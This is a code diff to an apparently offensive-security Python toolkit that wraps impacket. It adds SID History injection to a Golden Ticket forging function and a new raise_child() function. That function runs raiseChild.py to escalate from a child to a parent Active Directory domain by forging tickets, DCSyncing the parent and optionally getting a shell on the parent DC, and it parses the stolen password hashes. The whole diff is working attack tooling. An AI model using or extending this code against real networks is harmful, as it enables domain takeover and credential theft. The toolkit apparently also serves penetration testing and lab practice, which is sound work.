@@ -314,6 +314,7 @@ async def ticketer(
     aes_key: str | None = None,
     user: str = "Administrator",
     groups: str = "512,513,518,519,520",
+    extra_sid: str | None = None,
     dc_ip: str | None = None,
     timeout: int = 60,
 ) -> dict[str, Any]:
@@ -323,6 +324,10 @@ async def ticketer(
     memberships.  Used for Golden Ticket, Silver Ticket, and Diamond
     Ticket attacks.
 
+    For child→parent domain escalation, pass *extra_sid* with the
+    parent domain's Enterprise Admins SID (e.g. ``S-1-5-21-PARENT-519``)
+    to inject SID History into the forged ticket PAC.
+
     Args:
         domain: AD domain name.
         domain_sid: Domain SID (e.g. ``S-1-5-21-...``).
@@ -330,6 +335,8 @@ async def ticketer(
         aes_key: krbtgt AES-256 key for AES encryption.
         user: Username to embed in the forged ticket.
         groups: Comma-separated group RIDs to include in the PAC.
+        extra_sid: Additional SID to inject via SID History (for cross-domain
+            escalation, e.g. ``S-1-5-21-PARENT-519`` for Enterprise Admins).
         dc_ip: Domain controller IP address.
         timeout: Maximum seconds to wait.
 
@@ -345,11 +352,66 @@ async def ticketer(
     if aes_key:
         args.extend(["-aesKey", aes_key])
     args.extend(["-groups", groups])
+    if extra_sid:
+        args.extend(["-extra-sid", extra_sid])
     if dc_ip:
         args.extend(["-dc-ip", dc_ip])
     args.append(user)
 
     return await run_impacket_tool("ticketer.py", args, timeout=timeout)
+
+
+async def raise_child(
+    domain: str,
+    username: str,
+    password: str | None = None,
+    nt_hash: str | None = None,
+    target_exec: str | None = None,
+    dc_ip: str | None = None,
+    timeout: int = 120,
+) -> dict[str, Any]:
+    """Run ``raiseChild.py`` to escalate from child to parent domain.
+
+    This is impacket's one-shot child→parent escalation tool.  It
+    automatically:
+    1. Extracts the trust key for the parent domain
+    2. Forges a Golden Ticket with Enterprise Admin SID History
+    3. DCsyncs the parent domain
+    4. Optionally gets a shell on the parent DC
+
+    Args:
+        domain: Child domain name (e.g. ``north.sevenkingdoms.local``).
+        username: User in the child domain with DA or DCSync rights.
+        password: Plaintext password.
+        nt_hash: NT hash for pass-the-hash.
+        target_exec: Parent DC to get a shell on (optional).
+        dc_ip: Child domain DC IP.
+        timeout: Maximum seconds (120 — this is a multi-step attack).
+
+    Returns:
+        Result dict with captured parent domain credentials.
+    """
+    target_str = build_target_string(domain, username, password, nt_hash)
+    args = [target_str]
+
+    if nt_hash:
+        args.extend(["-hashes", f":{nt_hash}"])
+
+    if target_exec:
+        args.extend(["-target-exec", target_exec])
+
+    if dc_ip:
+        args.extend(["-dc-ip", dc_ip])
+
+    result = await run_impacket_tool("raiseChild.py", args, timeout=timeout)
+
+    # Parse any hashes from raiseChild output
+    if result["success"]:
+        hashes = _parse_secretsdump_hashes(result.get("output", ""))
+        if hashes:
+            result["parsed"] = {"hashes": hashes}
+
+    return result
 
 
 async def dcomexec(
